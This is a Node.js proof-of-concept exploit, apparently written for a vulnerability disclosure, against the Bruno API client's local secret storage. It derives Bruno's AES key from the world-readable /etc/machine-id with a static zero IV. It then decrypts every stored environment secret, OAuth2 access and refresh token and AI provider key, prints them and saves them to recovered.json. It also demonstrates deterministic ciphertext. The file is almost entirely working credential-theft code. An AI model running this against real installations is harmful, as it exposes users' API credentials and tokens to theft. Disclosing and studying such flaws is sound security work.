#!/usr/bin/env node
// ATTACKER — a *separate* process with (a) read access to the victim's Bruno
// userData file and (b) ordinary access to the host. It shares NO secret with
// the victim. It recovers every credential using only the world-readable
// machine identifier, replicating Bruno's exact key derivation:
//
//     rawKey = machineIdSync()                       // = sha256(machine-id)
//     key    = sha256(rawKey)                        // Bruno's aes256Encrypt
//     iv     = Buffer.alloc(16, 0)                   // STATIC zero IV
//     plaintext = AES-256-CBC-decrypt(key, iv, ct)
//
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { execSync } = require('child_process');
const { machineIdSync } = require('./vendored/machine-id');

const store = JSON.parse(fs.readFileSync(path.join(__dirname, 'bruno_userdata', 'secrets.json'), 'utf8'));

// --- Step 1: the "key" is public. Show the raw machine-id is world-readable.
let rawMachineId = '(unavailable)';
try { rawMachineId = execSync('cat /etc/machine-id /var/lib/dbus/machine-id 2>/dev/null || hostname', { encoding: 'utf8' }).trim().split('\n')[0]; } catch (_) {}
console.log('== ATTACKER: recover Bruno secrets with ZERO shared secrets ==');
console.log(`[1] Machine-id is NOT a secret. Any local process can read it:`);
console.log(`      $ cat /etc/machine-id   ->  ${rawMachineId}`);

// --- Step 2: replicate Bruno's key derivation (no victim input) -----------
const rawKey = machineIdSync();                                   // sha256(machine-id) hex
const key = crypto.createHash('sha256').update(rawKey).digest();  // Bruno's 32-byte key
const iv = Buffer.alloc(16, 0);                                   // Bruno's static zero IV
console.log(`[2] Derived Bruno's key from the public machine-id:`);
console.log(`      rawKey = machineIdSync()      = ${rawKey}`);
console.log(`      key    = sha256(rawKey)[0:8]  = ${key.toString('hex').slice(0, 16)}...`);
console.log(`      iv     = 00000000000000000000000000000000  (zero)\n`);

function bruteNothingDecrypt(blob) {
  // blob looks like "$01:<hexciphertext>"
  const hex = blob.slice(blob.indexOf(':') + 1);
  const d = crypto.createDecipheriv('aes-256-cbc', key, iv);
  return d.update(hex, 'hex', 'utf8') + d.final('utf8');
}

console.log('[3] Decrypting every stored credential (attacker has no key material):');
const recovered = {};
for (const c of store.collections) {
  for (const env of c.environments) {
    for (const s of env.secrets) {
      const pt = bruteNothingDecrypt(s.value);
      recovered[`env:${env.name}:${s.name}`] = pt;
      console.log(`      env  ${env.name}/${s.name.padEnd(11)} = ${pt}`);
    }
  }
}
for (const o of store.oauth2) {
  const creds = JSON.parse(bruteNothingDecrypt(o.data));
  recovered['oauth2'] = creds;
  console.log(`      oauth2 access_token          = ${creds.access_token}`);
  console.log(`      oauth2 refresh_token         = ${creds.refresh_token}`);
}
for (const a of store.aiKeys) {
  const pt = bruteNothingDecrypt(a.key);
  recovered[`ai:${a.provider}`] = pt;
  console.log(`      ai ${a.provider} key             = ${pt}`);
}

// --- Step 4: the static zero IV makes encryption deterministic ------------
const { encryptString } = require('./vendored/encryption');
const e1 = encryptString('duplicate-secret-value');
const e2 = encryptString('duplicate-secret-value');
console.log('\n[4] Static zero IV => deterministic ciphertext (CWE-329):');
console.log(`      encrypt("duplicate-secret-value") twice equal? ${e1 === e2}`);
console.log(`      -> equal plaintexts leak as equal ciphertexts; shared prefixes`);
console.log(`         share leading 16-byte blocks across all stored secrets.`);

fs.writeFileSync(path.join(__dirname, 'bruno_userdata', 'recovered.json'), JSON.stringify(recovered, null, 2));
console.log('\n   Wrote recovered plaintext -> bruno_userdata/recovered.json');
